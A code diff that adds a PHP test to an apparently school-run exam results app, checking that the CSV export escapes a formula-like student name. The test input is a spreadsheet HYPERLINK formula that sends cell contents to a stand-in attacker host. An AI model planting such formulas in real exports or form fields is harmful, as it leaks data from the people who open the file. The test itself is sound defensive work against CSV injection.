@@ -107,6 +107,15 @@ test('the admin results page and CSV export show the table', function () {
     expect($csv)->toContain('Student,')->toContain('"Ana ')->toContain(',170,85,A,Pass,1');
 });
 
+test('the results export writes a formula-like student name as text', function () {
+    actingAsRole(Login::ROLE_ADMIN);
+    score(enrol('=HYPERLINK("https://evil.example/?"&A1,"Open")'), 0, 90);
+
+    $csv = $this->get("/admin/exams/{$this->exam->id}/divisions/{$this->division->id}?format=csv")->streamedContent();
+
+    expect($csv)->toContain('"\'=HYPERLINK(')->not->toContain('"=HYPERLINK(');
+});
+
 test('the report card shows the student\'s marks, result and rank', function () {
     actingAsRole(Login::ROLE_ADMIN);
     $ana = enrol('Ana');
